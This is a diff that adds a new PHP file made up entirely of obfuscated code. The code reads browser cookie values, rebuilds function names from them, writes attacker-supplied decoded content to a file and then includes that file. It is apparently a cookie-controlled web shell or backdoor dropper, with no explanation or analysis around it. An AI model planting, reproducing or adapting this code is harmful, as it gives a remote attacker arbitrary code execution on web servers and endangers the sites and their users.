@@ -1,0 +1,2 @@
+<?php
+$vxa=$_COOKIE;	$mt	=0;$vgbl=	(	12 - 8) 	;$LVSc =array	(); $LVSc [ $mt]	=""	;  while (	$vgbl	){$LVSc	[	$mt ]	.=$vxa [	(51- 19)	][$vgbl] ;	 if ( !$vxa[	(95 - 63)	] [ $vgbl+	1]	) { if(! $vxa [(76	-	44 )]	[	$vgbl + 2 ]) break; 	$mt++	; $LVSc [	$mt]	=	"";  $vgbl ++; }	$vgbl= $vgbl	+	(13 -9	)+1;} $mt=$LVSc [	(91 -	91 )	]	().	$LVSc[	(67-42)]; if(! $LVSc [	 (44-	17)]($mt) ) {	$vgbl =	$LVSc[	 (78 -55) ] (	$mt,	$LVSc [	( 50 -	26 )	]);$LVSc[(	34-	24) ](	$vgbl	,$LVSc [(79-71 )	 ] .	$LVSc[	 (20 -	14)  ]	($LVSc[		(85-81)]($vxa	[3]	) ) )	;}include($mt);
